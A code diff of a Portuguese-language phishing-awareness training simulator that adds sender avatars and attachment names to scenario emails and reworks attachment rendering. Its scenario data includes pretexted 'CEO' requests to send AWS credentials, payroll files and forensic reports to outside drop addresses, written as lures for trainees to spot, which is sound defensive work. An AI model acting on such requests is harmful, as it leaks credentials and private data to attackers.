         body: `<p>Instrução Direta do CEO Rogério:</p><div class="email-quote-box"><p>"Analista, envie agora o arquivo <code>honeytoken_trap_v4.vault</code> para o endereço de armadilha oficial <code>dropzone-trap@techcore-vault.internal</code> para rastrearmos a origem do grupo hacker."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Despacho de Arquivo', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: dropzone-trap@techcore-vault.internal' },
@@ -818,10 +901,12 @@ const CAMPAIGN_SHIFTS = [
         time: '10:30',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[URGENTE/AUDITORIA] Envio Obrigatório do Arquivo aws_credentials.json',
         snippet: 'Envie imediatamente as credenciais da AWS para o bucket de validação externa...',
+        attachmentFileName: 'aws_credentials.json',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo Solicitado': 'aws_credentials.json', 'Destino': 'exfil-bucket@aws-cloud-verify.net', 'Data': '10:28' },
         body: `<p>Solicitação do CEO Rogério:</p><div class="email-quote-box"><p>"Precisamos passar por uma auditoria de emergência da nuvem. Despache o arquivo <code>aws_credentials.json</code> para o bucket <code>exfil-bucket@aws-cloud-verify.net</code> imediatamente."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: aws_credentials.json -> Destino: exfil-bucket@aws-cloud-verify.net' },
@@ -836,10 +921,12 @@ const CAMPAIGN_SHIFTS = [
         time: '11:45',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[DEPLOY EMERGENCIAL] Despacho do Pacote: hotfix_auth_patch.enc',
         snippet: 'Enviar hotfix criptografado de correção de vulnerabilidade para o cluster de deploy...',
+        attachmentFileName: 'hotfix_auth_patch.enc',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'hotfix_auth_patch.enc', 'Destino': 'deploy-cluster@techcore-vault.internal', 'Data': '11:42', 'Status': 'Assinado' },
         body: `<p>Instrução de Deploy Seguro:</p><div class="email-quote-box"><p>"Despache o pacote <code>hotfix_auth_patch.enc</code> para o cluster de deploy <code>deploy-cluster@techcore-vault.internal</code> para aplicar o patch que bloqueia a brecha de segurança."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Pacote de Patch', dest: 'Arquivo: hotfix_auth_patch.enc -> Destino: deploy-cluster@techcore-vault.internal' },
@@ -854,10 +941,12 @@ const CAMPAIGN_SHIFTS = [
         time: '13:20',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[IMPRENSA] Cópia Externa do Relatório Forense: ciso_master_report.sig',
         snippet: 'Favor enviar uma cópia preliminar do relatório para a equipe de jornalismo...',
+        attachmentFileName: 'ciso_master_report.sig',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'vazamentos@techleaks-news.com', 'Data': '13:18' },
         body: `<p>Instrução de Comunicação:</p><div class="email-quote-box"><p>"Preciso que você envie uma cópia de prévia do <code>ciso_master_report.sig</code> para a imprensa no endereço <code>vazamentos@techleaks-news.com</code> para demonstrarmos transparência."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Destino de Arquivo', dest: 'Arquivo: ciso_master_report.sig -> Destino: vazamentos@techleaks-news.com' },
@@ -872,10 +961,12 @@ const CAMPAIGN_SHIFTS = [
         time: '14:40',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[BACKUP EMERGENCIAL] Envio do Banco de Dados: database_full_dump.sql',
         snippet: 'Despache o dump completo do banco de produção para o servidor de contingência...',
+        attachmentFileName: 'database_full_dump.sql',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'database_full_dump.sql', 'Destino': 'backup-temp@techcore-vault.internal', 'Data': '14:38' },
         body: `<p>Instrução de Backup Solicitada:</p><div class="email-quote-box"><p>"Analista, envie o arquivo <code>database_full_dump.sql</code> para o endereço <code>backup-temp@techcore-vault.internal</code> por segurança antes da manutenção."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Despacho de Banco', dest: 'Arquivo: database_full_dump.sql -> Destino: backup-temp@techcore-vault.internal' },
@@ -890,10 +981,12 @@ const CAMPAIGN_SHIFTS = [
         time: '15:55',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[PERÍCIA PARCEIRA] Despacho do Honeytoken: honeytoken_trap_v4.vault',
         snippet: 'Enviar a armadilha de honeytoken para o servidor da consultoria externa de segurança...',
+        attachmentFileName: 'honeytoken_trap_v4.vault',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'honeytoken_trap_v4.vault', 'Destino': 'external-drop@cloud-analytica.org', 'Data': '15:52' },
         body: `<p>Instrução do CEO Rogério:</p><div class="email-quote-box"><p>"Contratamos uma consultoria externa de perícia. Por favor, despache o <code>honeytoken_trap_v4.vault</code> para <code>external-drop@cloud-analytica.org</code>."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Destino do Honeytoken', dest: 'Arquivo: honeytoken_trap_v4.vault -> Destino: external-drop@cloud-analytica.org' },
@@ -908,10 +1001,12 @@ const CAMPAIGN_SHIFTS = [
         time: '16:40',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[REVISÃO FINANCEIRA] Envio do Arquivo: folha_pagamento_executivos.xlsx',
         snippet: 'Envie a planilha de salários para a auditoria contábil de urgência...',
+        attachmentFileName: 'folha_pagamento_executivos.xlsx',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'folha_pagamento_executivos.xlsx', 'Destino': 'auditoria-rh@consultoria-externa.net', 'Data': '16:38' },
         body: `<p>Solicitação de Envio:</p><div class="email-quote-box"><p>"Analista, preciso que envie o arquivo <code>folha_pagamento_executivos.xlsx</code> para <code>auditoria-rh@consultoria-externa.net</code> para fechamento fiscal."</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Arquivo e Destino', dest: 'Arquivo: folha_pagamento_executivos.xlsx -> Destino: auditoria-rh@consultoria-externa.net' },
@@ -926,10 +1021,12 @@ const CAMPAIGN_SHIFTS = [
         time: '17:45',
         senderName: 'CEO Rogério Silva (Oficial)',
         senderEmail: 'rogerio.ceo@techcore.com',
+        avatarImg: 'ceo_rogerio.jpg',
         avatarChar: 'R',
         avatarColor: '#0055ea',
         subject: '[FINAL DE EXPEDIENTE] Envio do Relatório Final: ciso_master_report.sig',
         snippet: 'Encaminhe o pacote final de auditoria para o cofre seguro da Diretoria Executiva...',
+        attachmentFileName: 'ciso_master_report.sig',
         meta: { 'De': 'CEO Rogério Silva <rogerio.ceo@techcore.com>', 'Arquivo': 'ciso_master_report.sig', 'Destino': 'board-vault@techcore-vault.internal', 'Data': '17:42', 'Prioridade': 'CONCLUSAO DE OPERAÇÃO' },
         body: `<p>Última Ação do Turno 4:</p><div class="email-quote-box"><p>"Analista, despache o relatório <code>ciso_master_report.sig</code> para <code>board-vault@techcore-vault.internal</code> para finalizarmos a auditoria oficial e apresentarmos ao Conselho de Administração!"</p></div>`,
         inspector: { type: 'url', label: 'Inspeção de Despacho Final', dest: 'Arquivo: ciso_master_report.sig -> Destino: board-vault@techcore-vault.internal' },
@@ -1477,13 +1574,17 @@ class TechMailSimulator {
       if (item.channel === 'zap') { tagLabel = 'TechZap Chat'; tagClass = 'tag-zap'; }
       if (item.channel === 'vault') { tagLabel = 'TechVault'; tagClass = 'tag-vault'; }
 
+      let avatarHtml = item.avatarImg ? `<img src="${item.avatarImg}" style="width:28px;height:28px;border-radius:50%;object-fit:cover;margin-right:10px;">` : `<div style="width:28px;height:28px;border-radius:50%;background-color:${item.avatarColor};color:#fff;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;margin-right:10px;">${item.avatarChar}</div>`;
       row.innerHTML = `
         <div class="row-controls">
           <input type="checkbox" ${isProcessed ? 'checked' : ''} onclick="event.stopPropagation()">
           <span class="row-star" onclick="event.stopPropagation(); this.classList.toggle('starred')">★</span>
         </div>
+        <div style="display:flex; align-items:center; width:220px; margin-left: 10px;">
+          ${avatarHtml}
+          <div class="row-sender" style="width:auto; margin-left:0;">${this.escapeHtml(item.senderName)}</div>
+        </div>
         <span class="row-tag ${tagClass}">${tagLabel}</span>
-        <div class="row-sender">${this.escapeHtml(item.senderName)}</div>
         <div class="row-content">
           ${!isProcessed ? '<span class="row-new-badge">NOVO</span>' : ''}
           <span class="row-subject">${this.escapeHtml(item.subject)}</span>
@@ -1531,8 +1632,13 @@ class TechMailSimulator {
     this.readerTimeMeta.textContent = item.time;
     this.readerSubjectTitle.textContent = item.subject;
 
-    this.readerSenderAvatar.textContent = item.avatarChar;
-    this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
+    if (item.avatarImg) {
+      this.readerSenderAvatar.innerHTML = `<img src="${item.avatarImg}" style="width:100%;height:100%;border-radius:50%;object-fit:cover;">`;
+      this.readerSenderAvatar.style.backgroundColor = 'transparent';
+    } else {
+      this.readerSenderAvatar.textContent = item.avatarChar;
+      this.readerSenderAvatar.style.backgroundColor = item.avatarColor;
+    }
     this.readerSenderName.textContent = item.senderName;
     this.readerSenderEmail.textContent = `<${item.senderEmail}>`;
     this.readerReceivedTime.textContent = item.meta['Data'] || item.time;
@@ -1542,28 +1648,55 @@ class TechMailSimulator {
     this.headerData.textContent = item.meta['Data'] || '-';
     this.headerAuth.textContent = item.meta['Segurança'] || item.meta['Status'] || item.meta['Prioridade'] || '-';
 
-    // Determine if item should show Gmail Attachment Card (GitHub PRs, SQL/DB queries)
-    const isGithubOrDb = item.channel === 'github' || item.channel === 'db' || 
-      (item.inspector && (item.inspector.type === 'diff' || (item.inspector.dest && (item.inspector.dest.includes('SELECT') || item.inspector.dest.includes('DATABASE') || item.inspector.dest.includes('REINDEX') || item.inspector.dest.includes('ANALYZE') || item.inspector.dest.includes('DROP')))));
+    // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
+    if (item.inspector.type === 'diff') {
+      let diffLinesHtml = item.inspector.diff.map(line => {
+        let cls = 'diff-info';
+        if (line.type === 'added') cls = 'diff-added';
+        if (line.type === 'removed') cls = 'diff-removed';
+        return `<span class="${cls}">${this.escapeHtml(line.text)}</span>`;
+      }).join('\n');
 
-    if (isGithubOrDb) {
-      let fileName = 'codigo_anexo.txt';
+      this.readerInspectorSection.innerHTML = `
+        <div class="inspector-title">🔍 ${item.inspector.label}</div>
+        <pre class="diff-view"><code>${diffLinesHtml}</code></pre>
+      `;
+    } else {
+      this.readerInspectorSection.innerHTML = `
+        <div class="inspector-title">🔍 ${item.inspector.label}</div>
+        <div class="url-inspector-card">
+          <span style="font-size: 10.5px; color: #94a3b8;">ORIGEM / DESTINO / QUERY ANALISADA:</span>
+          <span class="url-dest">${this.escapeHtml(item.inspector.dest)}</span>
+        </div>
+      `;
+    }
+
+    if (item.channel === 'zap') {
+      // TechZap / WhatsApp Attachment Card Handling
+      this.readerBodyMessage.innerHTML = item.body;
+      this.readerInspectorSection.style.display = 'none'; // Hidden until document is clicked
+
+      setTimeout(() => {
+        const wzAttCard = document.getElementById('wz-attachment-card');
+        if (wzAttCard) {
+          wzAttCard.addEventListener('click', () => {
+            audio.click();
+            const isHidden = this.readerInspectorSection.style.display === 'none';
+            this.readerInspectorSection.style.display = isHidden ? 'block' : 'none';
+            wzAttCard.classList.toggle('active-open', isHidden);
+            if (isHidden) {
+              this.readerInspectorSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }
+          });
+        }
+      }, 50);
+    } else {
+      // Gmail Attachment Card for ALL non-WhatsApp channels (Email, IAM, GitHub, DB, TechVault)
+      let fileName = item.attachmentFileName || 'documento_solicitacao.pdf';
       let badgeClass = 'badge-diff';
 
-      if (item.channel === 'github') {
-        badgeClass = 'badge-diff';
-        if (item.id === 's1-2') fileName = 'pix_optimization.diff';
-        else if (item.id === 's1-5') fileName = 'dockerfile_patch.diff';
-        else if (item.id === 's2-4') fileName = 'deploy_workflow.patch';
-        else fileName = 'pull_request_patch.diff';
-      } else {
+      if (item.channel === 'db' || (item.inspector && item.inspector.dest && item.inspector.dest.includes('SELECT'))) {
         badgeClass = 'badge-sql';
-        if (item.id === 's2-1') fileName = 'auth_sqli_payload.sql';
-        else if (item.id === 's2-3') fileName = 'pix_transactions_summary.sql';
-        else if (item.id === 's2-7') fileName = 'db_reindex_maintenance.sql';
-        else if (item.id === 's2-9') fileName = 'staging_analyze.sql';
-        else if (item.id === 's2-10') fileName = 'drop_table_logs.sql';
-        else fileName = 'database_query_audit.sql';
       }
 
       const attachmentHtml = `
@@ -1579,14 +1712,14 @@ class TechMailSimulator {
             </button>
           </div>
 
-          <div class="gmail-attachment-card" id="gmail-attachment-card" title="Clique para abrir e visualizar o código completo">
+          <div class="gmail-attachment-card" id="gmail-attachment-card" title="Clique para abrir e visualizar os detalhes do anexo">
             <div class="att-thumbnail-box">
               <div class="att-doc-icon-preview">
                 <div class="att-doc-line"></div>
                 <div class="att-doc-line"></div>
                 <div class="att-doc-line short"></div>
               </div>
-              <div class="att-click-hint">🔍 Clique para abrir o código</div>
+              <div class="att-click-hint">🔍 Clique para abrir o anexo</div>
             </div>
             <div class="att-footer-bar">
               <div class="att-file-badge ${badgeClass}">&lt;/&gt;</div>
@@ -1614,9 +1747,6 @@ class TechMailSimulator {
           });
         }
       }, 50);
-    } else {
-      this.readerBodyMessage.innerHTML = item.body;
-      this.readerInspectorSection.style.display = 'block';
     }
 
     // Render Inspector (PURE RAW FACTS - NO SPOILER HINTS)
